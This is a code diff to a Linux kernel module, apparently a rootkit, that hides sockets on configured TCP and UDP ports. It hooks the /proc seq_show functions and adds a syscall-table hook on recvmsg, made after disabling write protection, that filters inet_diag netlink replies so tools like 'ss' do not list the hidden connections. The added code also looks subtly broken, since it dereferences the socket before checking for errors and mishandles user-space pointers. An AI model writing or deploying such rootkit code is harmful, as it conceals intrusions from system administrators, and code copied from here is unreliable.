@@ -9,6 +9,12 @@
 #include<linux/types.h>
 #include<net/tcp.h>
 #include<net/udp.h>
+#include<linux/netlink.h>
+#include<linux/inet_diag.h>
+#include<linux/socket.h>
+#include<linux/slab.h>
+
+#include "hooking.h"
 
 #define MAX_PORTC 255
 #define in_tcplist(x) port_in_list(x, tcp_ports, tcp_portc)
@@ -19,6 +25,9 @@ static unsigned int udp_ports[MAX_PORTC];
 static int tcp_portc;
 static int udp_portc;
 
+static int is_hidden = 0;
+static int rcount = 0;
+
 void ** udp_hook_ptr, **tcp_hook_ptr;
 
 module_param_array(tcp_ports, uint, &tcp_portc, 0);
@@ -28,6 +37,7 @@ MODULE_PARM_DESC(udp_ports, "Array of UDP ports");
 
 static int (*orig_tcp_seq_show)(struct seq_file*, void*);
 static int (*orig_udp_seq_show)(struct seq_file*, void*);
+static long (*orig_sys_recvmsg)(int, struct msghdr*, unsigned);
 
 static int port_in_list(unsigned int port, unsigned int list[], int count){
 	int i;
@@ -36,6 +46,63 @@ static int port_in_list(unsigned int port, unsigned int list[], int count){
 	}
 	return 0;
 } 
+
+static long my_sys_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags){
+  // Call the original function
+  long ret = orig_sys_recvmsg(fd, umsg, flags);
+
+  // Check if the file is really a socket and get it
+  int err = 0;
+  struct socket* s = sockfd_lookup(fd, &err);
+  struct sock* sk = s->sk;
+
+  // Check if the socket is used for the inet_diag protocol
+  if (!err && sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG) {
+
+    // Check if it is a process called "ss" (optional ;))
+    /*if (strcmp(current->comm, "ss") == 0) {*/
+    long remain = ret;
+
+      // Copy data from user space to kernel space
+    struct msghdr* msg = kmalloc(ret, GFP_KERNEL);
+    int err = copy_from_user(msg, umsg, ret);
+    struct nlmsghdr* hdr = msg->msg_iov->iov_base;
+    if (err) {
+      return ret; // panic
+    }
+
+    // Iterate the entries
+    do {
+      struct inet_diag_msg* r = NLMSG_DATA(hdr);
+
+      // We only have to consider TCP ports here because ss fetches
+      // UDP information from /proc/udp which we already handle
+      if (in_tcplist(r->id.idiag_sport) || in_tcplist(r->id.idiag_dport)) {
+        // Hide the entry by coping the remaining entries over it
+        long new_remain = remain;
+        struct nlmsghdr* next_entry = NLMSG_NEXT(hdr, new_remain);
+        memmove(hdr, next_entry, new_remain);
+
+        // Adjust the length variables
+        ret -= (remain - new_remain);
+        remain = new_remain;
+      } else {
+        // Nothing to do -> skip this entry
+        hdr = NLMSG_NEXT(hdr, remain);
+      }
+    } while (remain > 0);
+
+    // Copy data back to user space
+    err = copy_to_user(umsg, msg, ret);
+    kfree(msg);
+    if (err) {
+      return ret; // panic
+    }
+  /*}*/
+  }
+  return ret;
+
+}
 
 static int my_tcp_seq_show(struct seq_file * m, void * v){
 	struct inet_sock * inet;
@@ -106,19 +173,30 @@ void hide_sockets(void){
 		tcp_info = tcp_dent->data;
 		udp_info = udp_dent->data;
 
-		// Save and hook the TCP show function
 		tcp_hook_ptr = (void**) &tcp_info->seq_ops.show;
 		orig_tcp_seq_show = *tcp_hook_ptr;
 		*tcp_hook_ptr = my_tcp_seq_show;
 
-		// Save and hook the UDP show function
 		udp_hook_ptr = (void**) &udp_info->seq_ops.show;
 		orig_udp_seq_show = *udp_hook_ptr;
 		*udp_hook_ptr = my_udp_seq_show;
   	}
+
+	disable_wp();
+	orig_sys_recvmsg = syscall_table[__NR_recvmsg];
+	syscall_table[__NR_recvmsg] = my_sys_recvmsg;
+	enable_wp();
+	is_hidden = 1;
 }
+
+
 
 void unhide_sockets(void){
 	*udp_hook_ptr = orig_udp_seq_show;
 	*tcp_hook_ptr = orig_tcp_seq_show;
+
+	disable_wp();
+	syscall_table[__NR_recvmsg] = orig_sys_recvmsg;
+	enable_wp();
+	is_hidden = 0;
 }
